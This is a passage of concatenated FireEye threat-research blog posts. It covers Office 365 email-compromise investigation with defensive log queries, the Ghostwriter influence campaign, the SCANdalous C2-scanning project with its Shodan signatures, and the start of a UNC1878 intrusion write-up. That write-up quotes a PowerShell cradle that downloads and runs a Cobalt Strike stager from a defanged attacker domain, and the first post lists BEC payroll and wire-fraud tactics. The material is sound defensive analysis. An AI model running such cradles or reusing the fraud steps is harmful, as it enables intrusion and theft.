    <u>O365 searching</u>: Searches conducted within SharePoint and
    other O365 applications for content of interest. While not recorded
    in audit logs, SharePoint and OneDrive file interactions are
    recorded in the UAL.</li> <li>
    <u>Mail client usage</u>: Outlook or third-party mail clients used
    by attackers. Mail can be synced locally to the attacker’s machine
    and accessed later.</li> </ul>
 <p>
  <b>Phase 5: Complete Mission</b></p>
 <ul> <li>
    <u>Direct deposit update</u>: A request sent to the HR department to
    update the victim’s direct deposit information, redirecting payment
    to the BEC actor.</li> <li>
    <u>W-2 scam</u>: A request sent to the HR department for W-2 forms,
    used to harvest PII for tax fraud.</li> <li>
    <u>Wire transfer</u>: A wire transfer requested for an unpaid
    invoice, upcoming M&amp;A, charities, etc.</li> <li>
    <u>Third-party account abuse</u>: Abuse of the compromised user’s
    privileged access to third-party accounts and services, such as
    access to a corporate rewards site.</li> </ul>
 <h4>How Managed Defense Responds to O365 BECs</h4>
 <p>In this section, we’re going to walk through how Managed Defense
  investigates a typical O365 BEC case.</p>
 <p>Many of the steps in our investigation rely on querying for logs
  with PowerShell. To do this, first establish a remote PowerShell
  session to Exchange Online. The following Microsoft documentation
  provides guidance on two methods to do this:</p>
 <ul> <li>
    <a
      href="https://docs.microsoft.com/en-us/powershell/exchange/exchange-online/connect-to-exchange-online-powershell/connect-to-exchange-online-powershell">Connect
      to Exchange Online PowerShell with Basic authentication</a></li> <li>
    <a
      href="https://docs.microsoft.com/en-us/powershell/exchange/exchange-online-powershell-v2">Use
      the Exchange Online PowerShell with modern authentication using V2
  module</a></li> </ul>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/obscured/Picture1.png" alt="" /></p>
 <p>
  <b>Broad Scoping</b></p>
 <p>We start our investigations off by running broad queries against the
  Unified Audit Log (UAL) for suspicious activity. We’ll review OAuth
  activity too, which is especially important if something more
  nefarious than a financially motivated BEC is suspected. Any FireEye
  gear available to us—such as FireEye <a
  href="/content/fireeye-www/en_US/products/helix.html">Helix</a> and <a
    href="/content/fireeye-www/en_US/products/email-security.html">Email
  Security</a>—will be leveraged to augment the data available to us
  from Office 365. </p>
 <p>The following are a few initial scoping queries we’d typically run
  at the beginning of a Managed Defense engagement.</p>
 <p>
  <i>Scoping Recent Mailbox Rule Activity</i></p>
 <p>Even in large tenants, pulling back all recent mailbox rule activity
  doesn’t typically produce an unmanageable number of results, and
  attacker-created rules tend to stand out from the rest of the noise.</p>
 <p>Querying UAL for all mailbox rule activity in Helix:</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">class=ms_office365 action:[New-InboxRule,
          Set-InboxRule, Enable-InboxRule] | table [createdtime, action,
          username, srcipv4, srcregion, parameters, rawmsg]</span></td> </tr></tbody></table>
 <p>Query UAL for new mail rule activity in PowerShell:</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">Search-UnifiedAuditLog -StartDate
          (Get-Date).AddDays(-90) -EndDate (Get-Date) -ResultSize 5000
          -Operations
          &quot;New-InboxRule&quot;,&quot;Set-InboxRule&quot;,&quot;Enable-InboxRule&quot;
          | Export-CSV \path\to\file.csv –NoTypeInformation -Encoding
      utf8</span></td> </tr></tbody></table>
 <p>
  <i>Scoping SMTP Forwarding Activity</i></p>
 <p>SMTP forwarding is sometimes overlooked because it appears under a
  UAL operation separate from mailbox rules. This query looks for the
  <b>Set-Mailbox</b> operation containing a parameter to forward mail
  over SMTP, indicative of <a
    href="https://support.office.com/en-us/article/turn-on-automatic-forwarding-in-outlook-on-the-web-7f2670a1-7fff-4475-8a3c-5822d63b0c8e">automatic
  forwarding</a> being enabled from OWA.</p>
 <p>Querying UAL for SMTP forwarding in Helix:</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">class=ms_office365 action=Set-Mailbox
          rawmsg:ForwardingSmtpAddress | table [createdtime, action,
          username, srcipv4, srcregion, parameters, rawmsg]</span></td> </tr></tbody></table>
 <p>Querying UAL for SMTP forwarding in PowerShell:</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">Search-UnifiedAuditLog -StartDate
          (Get-Date).AddDays(-90) -EndDate (Get-Date) -ResultSize 5000
          -FreeText &quot;ForwardingSmtpAddress&quot; | Export-CSV
          \path\to\file.csv –NoTypeInformation -Encoding
      utf8</span></td> </tr></tbody></table>
 <p>
  <b>Analyze Compromised Users Logs</b></p>
 <p>After we’ve finished scoping the tenant, we’ll turn our attention to
  the individual users believed to be involved in the compromise. We’ll
  acquire all relevant O365 logs for the identified compromised user(s)
  - this includes the user's UAL, Mailbox Audit Log (MAL), and Admin
  audit log (if the user is an administrator). We’ll review these logs
  for anomalous account activity and assemble a list of attacker IP
  addresses and User-Agents strings. We’ll use this list to further
  scope the tenant.</p>
 <p>O365 investigations rely heavily on anomaly detection. Many times,
  the BEC actor may even be active at the same time as the user. In
  order to accurately differentiate between legitimate user activity and
  attacker activity within a compromised account, it's recommended to
  pull back as much data as possible to use as a reference for
  legitimate activity. Using the Helix query transforms <b>
    <i>groupby &lt; [srccountry,srcregion]</i></b>,<b> <i>groupby &lt; useragent</i></b>
  <i> </i>and<i> </i>
  <b>
    <i>groupby &lt; srcipv4</i></b>
  <i>,<b> </b></i>which highlight the least common geolocations, User
  Agent strings, and IP addresses, can also assist in identifying
  anomalies in results.</p>
 <p>Querying UAL for a user in Helix:</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">class=ms_office365 username=user@client.com
          | table [createdtime, action, username, srcipv4, srccountry,
          srcregion, useragent, rawmsg] | groupby &lt;
      [srccountry,srcregion]</span></td> </tr></tbody></table>
 <p>Querying UAL for a user in PowerShell:</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">Search-UnifiedAuditLog -StartDate
          mm/dd/yyyy -EndDate (Get-Date) -ResultSize 5000 -UserIds
          user@client.com | Export-CSV \path\to\file.csv
          –NoTypeInformation -Encoding utf8</span></td> </tr></tbody></table>
 <p>Querying MAL for a user in PowerShell:</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">Search-MailboxAuditLog -Identity
          user@client.com -LogonTypes Owner,Delegate,Admin -ShowDetails
          -StartDate (Get-Date).AddDays(-90) -EndDate (Get-Date) |
          Export-CSV \path\to\file.csv –NoTypeInformation -Encoding
      utf8</span></td> </tr></tbody></table>
 <p>Querying Admin Audit Log for all events within a certain date in PowerShell:</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">Search-AdminAuditLog -StartDate mm/dd/yyyy
          -EndDate mm/dd/yyyy | Export-CSV \path\to\file.csv
          –NoTypeInformation -Encoding utf8</span></td> </tr></tbody></table>
 <p>
  <b>Query UAL with New Leads</b></p>
 <p>Now that we’ve built a list of suspicious IP addresses (or even
  entire CIDR ranges) and User-Agent strings, we’ll run new queries
  against the entire UAL to try to identify other compromised user
  accounts. <i>We’ll repeat this step and the previous step for each
    newly identified user account.</i></p>
 <p>One advantage to using FireEye Helix platform over PowerShell is
  that we can query entire CIDR ranges. This is helpful when we observe
  attackers coming from a VPN or ISP that dynamically assigns IP
  addresses within the same address block.</p>
 <p>Queries for attacker User-Agent strings usually generate more noise
  to sift through than IP address searches. In practice, User-Agent
  queries are only beneficial if the attackers are using an uncommon
  browser or version of a browser. Due to limitations of the
  <b>Search-UnifiedAuditLog</b> cmdlet, we’ve had the most success using
  the FreeText parameter and searching for simple strings.</p>
 <p>In Helix:</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">class=ms_office365 (srcipv4:[1.2.3.4,
          2.3.4.0/24] OR useragent:Opera) | table [createdtime, action,
          username, srcipv4, srccountry, srcregion, useragent, rawmsg] |
          groupby username</span></td> </tr></tbody></table>
 <p>Querying the UAL for IPs and user agents in PowerShell:</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">Search-UnifiedAuditLog -StartDate
          mm/dd/yyyy -EndDate (Get-Date) -ResultSize 5000 -IPAddresses
          1.2.3.4, 2.3.4.5 | Export-CSV \path\to\file.csv
          –NoTypeInformation -Encoding utf8</span></td> </tr></tbody></table>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">Search-UnifiedAuditLog -StartDate
          mm/dd/yyyy -EndDate (Get-Date) -ResultSize 5000 -FreeText
          &quot;Opera&quot; | Export-CSV \path\to\file.csv
          –NoTypeInformation -Encoding utf8</span></td> </tr></tbody></table>
 <p>
  <b>Analyze Message Traces</b></p>
 <p>We’ll use PowerShell to query message traces for the compromised
  users we’ve identified. If the email was sent within the past 10 days,
  use the <b>Get-MessageTrace</b> cmdlet, which immediately returns
  results and allows teams to query IP addresses. For older emails, use
  the <b>Start-HistoricalSearch</b> cmdlet and download the report later
  from the Mail Flow section of the Security &amp; Compliance center.</p>
 <p>Querying for the last 10 days of mail sent by the victim in PowerShell:</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">Get-MessageTrace -StartDate
          (Get-Date).AddDays(-10) -EndDate (Get-Date) -SenderAddress
          victim@client.com | Select-Object Received, SenderAddress,
          RecipientAddress, Subject, Status, FromIP, Size, MessageID |
          Export-CSV \path\to\file.csv –NoTypeInformation -Encoding
      utf8</span></td> </tr></tbody></table>
 <p>Querying for older emails (up to 90 days) in PowerShell:</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">Start-HistoricalSearch -ReportTitle
          &quot;Mandiant O365 investigation&quot; -StartDate mm/dd/yyyy
          -EndDate mm/dd/yyyy -ReportType MessageTraceDetail
          -SenderAddress victim@client.com</span></td> </tr></tbody></table>
 <p>As Message Trace results are reviewed, attention should be given to
  IP addresses to determine which emails were sent by attackers. If
  phishing was the suspected initial compromise vector, it’s a good idea
  to also query for incoming mail received within a few days prior to
  the first compromise date and look for suspicious sender addresses
  and/or subject lines.</p>
 <p>
  <b>Acquire Emails of Interest</b></p>
 <p>With our list of suspicious emails identified from message traces,
  we’ll use the Content Search tool available in the Office 365 Security
  and Compliance Center acquire the email body and learn what domains
  were used in phishing lures (if phishing was present). Content
  Searches are performed by using a straightforward GUI, and the results
  can either be previewed in the browser, downloaded individually as EML
  files, or downloaded in bulk as PST files.</p>
 <p>
  <b>Final Scoping</b></p>
 <p>At this point of our investigation, the BEC should be sufficiently
  scoped within the tenant. To ensure any follow-on activity hasn’t
  occurred, we’ll take all of the attack indicators and perform our
  final queries across the UAL.</p>
 <p>With that said, there are still edge cases in which attacker
  activity wouldn’t appear in O365 logs. For example, perhaps an
  additional user has submitted their credentials to a phishing page,
  but the attackers haven’t used them to log in yet. To ensure we don’t
  miss this activity, we’ll perform additional scoping across available
  network logs, specifically for IP addresses and domains related to the
  attacker’s phishing infrastructure. We’ll also leverage other FireEye
  products, such as the Endpoint Security platform, to search for
  phishing domains present on a host’s web browser history.</p>
 <h4>Conclusion</h4>
 <p>Unauthorized access to O365 tenant doesn’t just pose a threat to an
  organization, but also to its staff and business partners.
  Organizations without enhanced security controls in O365 are at the
  greatest risk of experiencing a BEC. However, as multi
  factor-authentication becomes more and more commonplace, we’ve
  witnessed an increase of MFA bypass attempts performed by increasingly
  proficient attackers.</p>
 <p>It’s important to remember that social engineering plays a primary
  role throughout a BEC. Ensure that users are trained on how to
  identify credential harvesting forms, a common compromise vector. When
  in the midst of a BEC compromise, teams may want to promptly alert
  personnel in HR and finance-related roles to exercise extra caution
  when processing requests related to banking or wire transfers while
  the investigation is in progress.</p>
 <p>The examples covered in this blog post are just a sample of what
  Managed Defense performs while investigating an Office 365 compromise.
  To take a proactive approach at preventing BECs, make sure the
  following best practices are implemented in a O365 tenant.
  Additionally, FireEye Email Security offers protections against
  phishing and the Helix platform’s O365 ruleset can alert on anomalous
  activity as soon as it happens.</p>
 <h4>Recommended Best Practices</h4>
 <ul> <li>Ensure mailbox audit logging is enabled on all accounts</li>
    <li>Disable Legacy Authentication protocols</li> <li>Enable
    multi-factor authentication (MFA)</li> <li>Enforce strong passwords
    and a password expiration policy</li> <li>Forward O365 audit logs to
    a centralized logging platform for extended retention</li>
    <li>Enforce an account lockout policy in Azure/on-premise Active
  Directory</li> <li>Restrict mail forwarding to external domains</li> </ul>
 <h4>Acknowledgements</h4>
 <p>Special thanks to Doug Bienstock, Glenn Edwards, Josh Madeley, and
  Tim Martin for their research and assistance on the topic.</p>
http://www.fireeye.com/blog/threat-research/2020/07/insights-into-office-365-attacks-and-how-managed-defense-investigates.html2020-07-30T19:00:00.000Z2020-07-30T18:52:37.937Z'Ghostwriter' Influence Campaign: Unknown Actors Leverage Website
Compromises and Fabricated Content to Push Narratives Aligned With
Russian Security Interestsnoemail@noemail.orgLee Foster<p>Mandiant Threat Intelligence has tied together several information
  operations that we assess with moderate confidence comprise part of a
  broader influence campaign—ongoing since at least March 2017—aligned
  with Russian security interests. The operations have primarily
  targeted audiences in Lithuania, Latvia, and Poland with narratives
  critical of the North Atlantic Treaty Organization’s (NATO) presence
  in Eastern Europe, occasionally leveraging other themes such as
  anti-U.S. and COVID-19-related narratives as part of this broader
  anti-NATO agenda. We have dubbed this campaign “<a href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/Ghostwriter-Influence-Campaign.pdf">Ghostwriter</a>.”</p>
 <p>Many, though not all of the incidents we suspect to be part of the
  Ghostwriter campaign, appear to have leveraged website compromises or
  spoofed email accounts to disseminate fabricated content, including
  falsified news articles, quotes, correspondence and other documents
  designed to appear as coming from military officials and political
  figures in the target countries.</p>
 <p>This falsified content has been referenced as source material in
  articles and op-eds authored by at least 14 inauthentic personas
  posing as locals, journalists and analysts within those countries.
  These articles and op-eds, primarily written in English, have been
  consistently published to a core set of third-party websites that
  appear to accept user-submitted content, most notably OpEdNews.com,
  BalticWord.com, and the pro-Russian site TheDuran.com, among others,
  as well as to suspected Ghostwriter-affiliated blogs.</p>
 <p>Some of these incidents and personas have received public attention
  from researchers, foreign news outlets, or government entities in
  Lithuania and Poland, but have not been tied to a broader activity
  set. Others have received little attention and remain relatively
  obscure. Mandiant Threat Intelligence has independently discovered
  several Ghostwriter personas and identified additional incidents
  involving some of those personas previously exposed.</p>
 <p>We believe the assets and operations discussed in this <a
  href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/Ghostwriter-Influence-Campaign.pdf">report</a>
  are for the first time being collectively tied together and assessed
  to comprise part of a larger, concerted and ongoing influence campaign.</p>
 <p>Read <a
    href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/Ghostwriter-Influence-Campaign.pdf">the
  report</a> today to learn more.</p>
http://www.fireeye.com/blog/threat-research/2020/07/ghostwriter-influence-campaign.html2020-07-29T02:15:00.000Z2020-07-29T16:38:07.315ZSCANdalous! (External Detection Using Network Scan Data and Automation)noemail@noemail.orgAaron Stephens<h4>Real Quick</h4>
 <p>In case you’re thrown by that fantastic title, our lawyers made us
  change the name of this project so we wouldn’t get sued.
  SCANdalous—a.k.a. Scannah Montana a.k.a. Scanny McScanface a.k.a.
  “Scan I Kick It? (Yes You Scan)”—had another name before today that,
  for legal reasons, we’re keeping to ourselves. A special thanks to our
  legal team who is always looking out for us, this blog post would be a
  lot less fun without them. Strap in folks.</p>
 <h4>Introduction</h4>
 <p>Advanced Practices is known for using primary source data obtained
  through <a
    href="/content/fireeye-www/en_US/mandiant/incident-response.html">Mandiant
    Incident Response</a>, <a
    href="/content/fireeye-www/en_US/mandiant/managed-detection-and-response.html">Managed
  Defense</a>, and product telemetry across thousands of FireEye
  clients. Regular, first-hand observations of threat actors afford us
  opportunities to learn intimate details of their modus operandi. While
  our visibility from organic data is vast, we also derive value from
  third-party data sources. By looking outwards, we extend our
  visibility beyond our clients’ environments and shorten the time it
  takes to detect adversaries in the wild—often before they initiate
  intrusions against our clients.</p>
 <p>In October 2019, Aaron Stephens gave his <a
    href="https://www.youtube.com/watch?v=x1tEOkY-7JE">“Scan’t Touch
  This”</a> talk at the annual FireEye Cyber Defense Summit (slides
  available <a
    href="https://github.com/aaronst/talks/blob/master/scanttouchthis.pdf">on
    his Github</a>). He discussed using network scan data for external
  detection and provided examples of how to profile command and control
  (C2) servers for various post-exploitation frameworks used by criminal
  and intelligence organizations alike. However, manual application of
  those techniques doesn’t scale. It may work if your role focuses on
  one or two groups, but Advanced Practices’ scope is much broader. We
  needed a solution that would enable us to track thousands of groups,
  malware families and profiles. In this blog post we’d like to talk
  about that journey, highlight some wins, and for the first time
  publicly, introduce the project behind it all: SCANdalous.</p>
 <h4>Pre-SCANdalous Case Studies</h4>
 <p>Prior to any sort of system or automation, our team used traditional
  profiling methodologies to manually identify servers of interest. The
  following are some examples. The success we found in these case
  studies served as the primary motivation for SCANdalous.</p>
 <p>
  <i>APT39 SSH Tunneling</i></p>
 <p>After observing APT39 in a series of intrusions, we determined they
  frequently created <a
    href="/content/fireeye-www/en_US/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html">Secure
    Shell (SSH) tunnels with PuTTY Link to forward Remote Desktop
  Protocol</a> connections to internal hosts within the target
  environment. Additionally, they preferred using BitVise SSH servers
  listening on port 443. Finally, they were using servers hosted by
  WorldStream B.V.</p>
 <p>Independent isolation of any one of these characteristics would
  produce a lot of unrelated servers; however, the aggregation of
  characteristics provided a strong signal for newly established
  infrastructure of interest. We used this established profile and
  others to illuminate dozens of servers we later attributed to <a
  href="/content/fireeye-www/en_US/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html">APT39</a>,
  often before they were used against a target.</p>
 <p>
  <i>APT34 QUADAGENT</i></p>
 <p>In February 2018, an independent researcher shared a sample of what
  would later be named QUADAGENT. We had not observed it in an intrusion
  yet; however, by analyzing the characteristics of the C2, we were able
  to develop a strong profile of the servers to track over time. For
  example, our team identified the server <span
  class="code">185.161.208\.37</span> and domain <span
  class="code">rdppath\.com</span> within hours of it being established.
  A week later, we identified a QUADAGENT dropper with the previously
  identified C2. Additional examples of QUADAGENT are depicted in Figure 1.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/scandalous/Picture1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: QUADAGENT C2 servers in the
    Shodan user interface</span></p>
 <p>Five days after the QUADAGENT dropper was identified, Mandiant was
  engaged by a victim that was targeted via the same C2. This activity
  was later attributed to APT34. During the investigation, Mandiant
  uncovered APT34 using RULER.HOMEPAGE. This was the first time our
  consultants observed the tool and technique used in the wild by a real
  threat actor. Our team developed a profile of servers hosting HOMEPAGE
  payloads and began tracking their deployment in the wild. Figure 2
  shows a timeline of QUADAGENT C2 servers discovered between February
  and November of 2018.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/scandalous/Picture2a.jpg" alt="" />
  <span class="type-XS">
    <br /> Figure 2: Timeline of QUADAGENT C2 servers discovered
    throughout 2018</span></p>
 <p>
  <i>APT33 RULER.HOMEPAGE, POSHC2, and POWERTON</i></p>
 <p>A month after that aforementioned intrusion, Managed Defense
  discovered a threat actor using RULER.HOMEPAGE to download and execute
  POSHC2. All the RULER.HOMEPAGE servers were previously identified due
  to our efforts. Our team developed a profile for POSHC2 and began
  tracking their deployment in the wild. The threat actor pivoted to a
  novel PowerShell backdoor, POWERTON. Our team repeated our workflow
  and began illuminating those C2 servers as well. This activity was
  later attributed to APT33 and was documented in our <a href="/content/fireeye-www/en_US/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html">OVERRULED post</a>.</p>
 <h4>SCANdalous</h4>
 <p>
  <i>Scanner, Better, Faster, Stronger</i></p>
 <p>Our use of scan data was proving wildly successful, and we wanted to
  use more of it, but we needed to innovate. How could we leverage this
  dataset and methodology to track not one or two, but dozens of active
  groups that we observe across our solutions and services? Even if
  every member of Advanced Practices was dedicated to external
  detection, we would still not have enough time or resources to keep up
  with the amount of manual work required. But that’s the key word:
  <i>Manual</i>. Our workflow consumed hours of individual analyst
  actions, and we had to change that. This was the beginning of
  SCANdalous: An automated system for external detection using
  third-party network scan data.</p>
 <p>A couple of nice things about computers: They’re great at
  multitasking, and they don’t forget. The tasks that were taking us
  hours to do—if we had time, and if we remembered to do them every
  day—were now taking SCANdalous minutes if not seconds. This not only
  afforded us additional time for analysis, it gave us the capability to
  expand our scope. Now we not only look for specific groups, we also
  search for common malware, tools and frameworks in general. We deploy
  weak signals (or broad signatures) for software that isn’t inherently
  bad, but is often used by threat actors.</p>
 <p>Our external detection was further improved by automating additional
  collection tasks, executed by SCANdalous upon a discovery—we call them
  follow-on actions. For example, if an interesting open directory is
  identified, acquire certain files. These actions ensure the team never
  misses an opportunity during “non-working hours.” If SCANdalous finds
  something interesting on a weekend or holiday, we know it will perform
  the time-sensitive tasks against the server and in defense of our clients.</p>
 <p>The data we collect not only helps us track things we aren’t seeing
  at our clients, it allows us to provide timely and historical context
  to our incident responders and security analysts. Taking observations
  from Mandiant Incident Response or Managed Defense and distilling them
  into knowledge we can carry forward has always been our bread and
  butter. Now, with SCANdalous in the mix, we can project that knowledge
  out onto the Internet as a whole.</p>
 <p>
  <i>Collection Metrics</i></p>
 <p>Looking back on where we started with our manual efforts, we’re
  pleased to see how far this project has come, and is perhaps best
  illustrated by examining the numbers. Today (and as we write these
  continue to grow), SCANdalous holds over five thousand signatures
  across multiple sources, covering dozens of named malware families and
  threat groups. Since its inception, SCANdalous has produced over two
  million hits. Every single one of those, a piece of contextualized
  data that helps our team make analytical decisions. Of course, raw
  volume isn’t everything, so let’s dive a little deeper.</p>
 <p>When an analyst discovers that an IP address has been used by an
  adversary against a named organization, they denote that usage in our
  knowledge store. While the time at which this observation occurs does
  not always correlate with when it was used in an intrusion, knowing
  when we became aware of that use is still valuable. We can
  cross-reference these times with data from SCANdalous to help us
  understand the impact of our external detection.</p>
 <p>Looking at the IP addresses marked by an analyst as observed at a
  client in the last year, we find that 21.7% (more than one in five)
  were also found by SCANdalous. Of that fifth, SCANdalous has an
  average lead time of 47 days. If we only consider the IP addresses
  that SCANdalous found first, the average lead time jumps to 106 days.
  Going even deeper and examining this data month-to-month, we find a
  steady upward trend in the percentage of IP addresses identified by
  SCANdalous before being observed at a client (Figure 3).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/scandalous/Picture3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: Percentage of IP addresses
    found by SCANdalous before being marked as observed at a client by a
    FireEye analyst</span></p>
 <p>A similar pattern can be seen for SCANdalous’ average lead time over
  the same data (Figure 4).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/scandalous/Picture4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: Average lead time in days for
    SCANdalous over the same data shown in Figure 3</span></p>
 <p>As we continue to create signatures and increase our external
  detection efforts, we can see from these numbers that the
  effectiveness and value of the resulting data grow as well.</p>
 <h4>SCANdalous Case Studies</h4>
 <p>Today in Advanced Practices, SCANdalous is a core element of our
  external detection work. It has provided us with a new lens through
  which we can observe threat activity on a scale and scope beyond our
  organic data, and enriches our workflows in support of Mandiant. Here
  are a few of our favorite examples:</p>
 <p>
  <i>FIN6</i></p>
 <p>In early 2019, SCANdalous identified a Cobalt Strike C2 server that
  we were able to associate with FIN6. Four hours later, the server was
  used to target a Managed Defense client, as discussed in our blog
    post, <a
    href="/content/fireeye-www/en_US/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html">Pick-Six:
    Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and
    LockerGoga Ransomware</a>.</p>
 <p>
  <i>FIN7</i></p>
 <p>In late 2019, SCANdalous identified a BOOSTWRITE C2 server and
  automatically acquired keying material that was later used to decrypt
  files found in a FIN7 intrusion worked by Mandiant consultants, as
  discussed in our blog post, <a
    href="/content/fireeye-www/en_US/blog/threat-research/2019/10/mahalo-fin7-responding-to-new-tools-and-techniques.html">Mahalo
    FIN7: Responding to the Criminal Operators’ New Tools and Techniques</a>.</p>
 <p>
  <i>UNC1878 (financially motivated)</i></p>
 <p>Some of you may also remember our <a
    href="/content/fireeye-www/en_US/blog/threat-research/2020/03/the-cycle-of-adversary-pursuit.html">recent
    blog post on UNC1878</a>. It serves as a great case study for how we
  grow an initial observation into a larger set of data, and then use
  that knowledge to find more activity across our offerings. Much of the
  early work that went into tracking that activity (see the section
  titled “Expansion”) happened via SCANdalous. The quick response from
  Managed Defense gave us just enough information to build a profile of
  the C2 and let our automated system take it from there. Over the next
  couple months, SCANdalous identified numerous servers matching
  UNC1878’s profile. This allowed us to not only analyze and attribute
  new network infrastructure, it also helped us observe when and how
  they were changing their operations over time.</p>
 <h4>Conclusion</h4>
 <p>There are hundreds more stories to tell, but the point is the same.
  When we find value in an analytical workflow, we ask ourselves how we
  can do it better and faster. The automation we build into our tools
  allows us to not only accomplish more of the work we were doing
  manually, it enables us to work on things we never could before. Of
  course, the conversion doesn’t happen all at once. Like all good
  things, we made a lot of incremental improvements over time to get
  where we are today, and we’re still finding ways to make more.
  Continuing to innovate is how we keep moving forward – as Advanced
  Practices, as FireEye, and as an industry.</p>
 <h4>Example Signatures</h4>
 <p>The following are example Shodan queries; however, any source of
  scan data can be used.</p>
 <p>
  <b>Used to Identify APT39 C2 Servers</b></p>
 <ul> <li>
    <span class="code">product:“bitvise” port:“443” org:“WorldStream
  B.V.”</span></li> </ul>
 <p>
  <b>Used to Identify QUADAGENT C2 Servers</b></p>
 <ul> <li>
    <span class="code">“PHP/7.2.0beta2”</span></li> </ul>
 <p>
  <b>RULER.HOMEPAGE Payloads</b></p>
 <ul> <li>
    <span
  class="code">html:“clsid:0006F063-0000-0000-C000-000000000046”</span></li> </ul>
http://www.fireeye.com/blog/threat-research/2020/07/scandalous-external-detection-using-network-scan-data-and-automation.html2020-07-13T18:30:00.000Z2020-07-24T07:20:13.581ZIt’s Your Money and They Want It Now — The Cycle of Adversary Pursuitnoemail@noemail.orgVan Ta<p>When we discover new intrusions, we ask ourselves questions that will
  help us understand the totality of the activity set.</p>
 <p>How common is this activity? Is there anything unique or special
  about this malware or campaign? What is new and what is old in terms
  of TTPs or infrastructure? Is this being seen anywhere else? What
  information do I have that substantiates the nature of this threat actor?</p>
 <p>To track a fast-moving adversary over time, we exploit organic
  intrusion data, pivot to other data sets, and make that knowledge
  actionable for analysts and incident responders, enabling new
  discoveries and assessments on the actor. The FireEye Advanced
  Practices team exists to know more about the adversary than anyone
  else, and by asking and answering questions such as these, we enable
  analyst action in security efforts. In this blog post, we highlight
  how our cycle of identification, expansion, and discovery was used to
  track a financially motivated actor across FireEye’s global data sets.</p>
 <h4>Identification</h4>
 <p>On January 29, 2020, <a
    href="/content/fireeye-www/en_US/mandiant/managed-detection-and-response.html">FireEye
    Managed Defense</a> investigated multiple TRICKBOT deployments
  against a U.S. based client. Shortly after initial deployment,
  TRICKBOT’s networkDll module ran the following network reconnaissance
  commands (Figure 1).</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">ipconfig /all<br />  net config
          workstation<br />  net view /all<br />  net view /all
          /domain<br />  nltest /domain_trusts<br />  nltest
          /domain_trusts /all_trusts</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 1: Initial Reconnaissance</span></p>
 <p>Approximately twenty minutes after reconnaissance, the adversary ran
  a PowerShell command to download and execute a Cobalt Strike HTTPS
  BEACON stager in memory (Figure 2).</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">cmd.exe /c powershell.exe -nop –w hidden –c
          “IEX ((new-object
      net.webclient).downloadstring(‘hxxps://cylenceprotect[.]com:80/abresgbserthgsbabrt’))”</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 2: PowerShell download cradle used to
    request a Cobalt Strike stager</span></p>
 <p>Six minutes later, Managed Defense identified evidence of
  enumeration and attempted lateral movement through the BEACON implant.
  Managed Defense alerted the client of the activity and the affected
  hosts were contained, stopping the intrusion in its tracks. A delta of
  approximately forty-six minutes between a TRICKBOT infection and
  attempted lateral movement was highly unusual and, along with the
  clever masquerade domain, warranted further examination by our team.</p>
 <p>Although light, indicators from this intrusion were distinct enough
  to create an uncategorized threat group, referred to as UNC1878. At
  the time of initial clustering, UNC1878’s intent was not fully
  understood due to the rapid containment of the intrusion by Managed
  Defense. By creating this label, we are able to link activity from the
  Managed Defense investigation into a single entity, allowing us to
  expand our understanding of this group and track their activity over
  time. This is especially important when dealing with campaigns
  involving mass malware, as it helps delineate the interactive actor
  from the malware campaign they are leveraging. For more information on
  our clustering methodology, check out our post about how we <a
    href="/content/fireeye-www/en_US/blog/threat-research/2019/03/clustering-and-associating-attacker-activity-at-scale.html">analyze,
    separate, or merge these clusters at scale</a>.</p>
 <h4>Expansion</h4>
 <p>Pivoting on the command and control (C2) domain allowed us to begin
  building a profile of UNC1878 network infrastructure. WHOIS records
  for cylenceprotect[.]com (Figure 3)<i> </i>revealed that the domain
  was registered on January 27, 2020, with the registrar &quot;Hosting
  Concepts B.V. d/b/a Openprovider&quot;, less than two days before we
  saw this domain used in activity impacting the Managed Defense customer.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">Domain Name: cylenceprotect.com<br />
          Registry Domain ID: 2485487352_DOMAIN_COM-VRSN<br />
          Registrar WHOIS Server: whois.registrar.eu<br />  Registrar
          URL: http://www.registrar.eu<br />  Updated Date:
          2020-01-28T00:35:43Z<br />  Creation
